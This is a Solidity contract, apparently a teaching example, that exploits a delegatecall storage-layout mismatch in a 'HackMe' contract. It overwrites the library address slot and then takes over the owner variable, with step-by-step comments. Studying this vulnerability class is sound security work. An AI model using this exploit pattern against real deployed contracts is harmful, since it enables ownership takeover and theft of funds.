// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.19;

interface HackMe{
    function doSomething(uint) external;
}

contract Attack{
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackme;

    constructor(address _hackme){
        hackme = HackMe(_hackme);
    }

    /*
        What's going on here?
            - So this attack function calls `doSomething` function of 'HackMe.sol' two times
            - First time
                a. As the storage or state variables of lib and hackme differs, so when 'doSomething' is delegately called by 'HackMe.sol', the 'doSomething' function of 'Lib.sol' got triggered up, and it then affects the 'Lib public lib' of the 'HackMe.sol' contract, 
                b. why it affect that -> Cuz it was clear that as state variables are not properly alloted in sequence, thus the first state variable gonna be changed despite the type
                c. So, we played in a quite clever way, as you can see the 'address' is type casted to 'uint' such that 'Lib public lib' will get the current address of this smart contract and then that contract will be kind of our control right in the second time we gonna trigger do Something...
            - 2nd time
                a. Now that 'Lib public lib' that is 'lib' contains address of our smart contract, and when the doSomething will be called again, this time 'HackMe.sol' gonna trigger 'doSomething' function of our Attack contract, why we did this, see the next point
                b. Yea so, you must have noticed that on starting of this contract, state variables are in order and matches with that 'HackMe.sol' state variables, this is done such that we can mimic the 'HackMe.sol'
                c. when our 'doSomething' function be triggered of 'Attack.sol', Take a look and you will find the code line -> 'owner = msg.sender' which will change the owner of the contract which is delegately calling this 'doSomething' function and here it's 'HackMe.sol' which is doing this task, so yes it's owner got changed to the 'msg.sender' which is our contract, why? -> look at the comments inside the 'doSomething' function of 'Attack.sol'
     */

    function attack() external{
        hackme.doSomething(uint256(uint160((address(this)))));
        hackme.doSomething(1);   
    }

    function doSomething(uint _num) public {
        // Attack -> HackMe --- delegateCall ----> Attack
        //           msg.sender = Attack           msg.sender = Attack
        owner = msg.sender;
        someNumber = _num;
    }
}